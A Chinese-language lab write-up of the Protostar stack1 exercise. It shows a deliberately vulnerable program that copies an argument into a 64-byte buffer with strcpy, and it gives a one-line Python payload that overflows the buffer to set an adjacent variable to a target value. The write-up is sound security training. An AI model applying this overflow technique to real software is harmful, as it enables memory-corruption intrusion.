---
title: Protostar_stack1
updated: 2023-11-07 07:27:02Z
created: 2023-06-26 03:09:04Z
---

运行程序，如下

![bfabf3b206c7f681d552ac916bc009a2.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/bfabf3b206c7f681d552ac916bc009a2.png)

**checksec**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/d3ae0530430fd8b497a72ade0e9fa2a2.png" alt="d3ae0530430fd8b497a72ade0e9fa2a2.png" width="430" height="218" class="jop-noMdConv">**

查看反编译代码

```asm
void main(char **argv, char **envp)
{
    undefined auStack84 [64];
    int32_t iStack20;
    
    if (argv == (char **)0x1) {
        errx(1, "please specify an argument\n");
    }
    iStack20 = 0;
    strcpy(auStack84, envp[1]);
    if (iStack20 == 0x61626364) {
        puts("you have correctly got the variable to the right value");
    } else {
        printf("Try again, you got 0x%08x\n", iStack20);
    }
    return;
}
```

本题目相较于stack0,增加一个检测`(iStack20 == 0x61626364)`

**exp如下：**

**(0x61626364即abcd,要以小端序格式输入，adba --> \\x64\\x63\\x62\\x61)**

`` ./stack1 `python -c "print('A'*64+'\x64\x63\x62\x61')"` ``

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/c5a4931b42cb39cab0893683b1ca473b.png" alt="c5a4931b42cb39cab0893683b1ca473b.png" width="473" height="40">

&nbsp;

&nbsp;

&nbsp;

&nbsp;